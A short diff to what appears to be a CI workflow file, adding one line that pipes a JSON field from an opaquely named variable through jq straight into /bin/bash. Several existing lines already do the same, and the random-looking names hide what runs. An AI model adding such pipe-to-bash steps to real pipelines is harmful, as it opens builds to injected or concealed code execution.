@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$qbbtx6971" | jq -r .wpmy1664 | /bin/bash
           printf '%s' "$k2" | jq -r .hxh0 | /bin/bash
           printf '%s' "$qmz05634" | jq -r .oxijt8034 | /bin/bash
+          echo $cr44 | jq -r .lzsy2 | /bin/bash
 
       - name: Save archive
         if: always()
